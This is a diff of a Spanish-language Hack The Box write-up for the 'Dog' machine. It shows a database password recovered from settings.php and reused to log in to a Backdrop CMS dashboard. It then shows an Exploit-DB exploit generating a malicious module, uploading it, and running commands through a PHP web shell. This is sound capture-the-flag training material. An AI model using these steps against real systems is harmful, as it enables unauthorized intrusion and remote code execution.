@@ -1,6 +1,6 @@
 ---
 title: Dog
-date: 2025-12-28 18:00:00 +0200
+date: 2025-12-28 11:00:00 +0200
 categories: [writeup, hackthebox]
 tags: [hackthebox, dog ]     
 image:
@@ -91,7 +91,7 @@ lo que nos permite obtener ficheros tan importantes como ```settings.php```
 ``` shell
 $database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
 ```
-Una de las lineas de ```settings.php``` contiene la password de root de mysql
+Una de las líneas de ```settings.php``` contiene la password de root de mysql
 
 > BackDropJ2024DS2024
 
@@ -108,15 +108,13 @@ files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:      
 ```
 
 Al investigar un poco la web podemos ver que en apartado ```About``` aparece un usuario de soporte ```support@dog.htb```. Así que parece buena
-idea buscar usuarios con el patron ```@dog```. Encontramos ```tiffany@dog.htb``` y si lo probamos para loguearnos en la web podemos acceder a un Dashboard.
+idea buscar usuarios con el patron ```@dog```. Encontramos ```tiffany@dog.htb``` y si probamos a loguearnos en la web con la password de la base de datos encontrada podemos acceder a un Dashboard.
 
 > tiffany
 
 ## Task 6
 
 What system user is the Backdrop CMS instance running as on Dog?
-
-https://www.exploit-db.com/exploits/52021
 
 ```shell
 ┌──(pmartinezr㉿kali)-[~/htb/dog]
@@ -127,7 +125,8 @@ Evil module generated! shell.zip
 Go to http://10.129.26.186/admin/modules/install and upload the shell.zip for Manual Installation.
 Your shell address: http://10.129.26.186/modules/shell/shell.php
 ```
-Siguiendo estas instrucciones construyo este módulo, el cual debemos instalar manualmente
+Siguiendo estas instrucciones construyo este módulo con este script de python, el cual debemos instalar manualmente
+[https://www.exploit-db.com/exploits/52021](https://www.exploit-db.com/exploits/52021)
 
 ``` shell
 ┌──(pmartinezr㉿kali)-[~/htb/dog]
@@ -142,8 +141,9 @@ shell/shell.tar
 shell/shell.info
 shell/shell.php
 ```
-Cuando intentamos subir este módulo para instalarlo parece que no le gusta otro tipo de fichero que no sea un ```tar.gz``` por lo que lo descomprimo con zip 
-y luego lo vuelvo a comprimir con tar. 
+Entendiendo que este exploit se basa en que tenemos un usuario con permisos para instalar un módulo nuevo. Esto en la web
+en el apartado de ```Funcionality``` y subiendo un módulo con la opción de subirlo manualmente.
+Cuando intentamos subir este módulo para instalarlo parece que no le gusta otro tipo de fichero que no sea un ```tar.gz``` por lo que lo descomprimo con zip y luego lo vuelvo a comprimir con tar. 
 Ahora sí podemos ver el módulo accediendo a http://10.129.26.186/modules/shell/shell.php
 
 ``` html
@@ -158,7 +158,7 @@ Ahora sí podemos ver el módulo accediendo a http://10.129.26.186/modules/shell
     </body>
     </html>
 ```
-Ahora introducimos un comando ```whoami```
+En esta shell mínima de PHP introducimos un comando ```whoami```
 
 > www-data
 
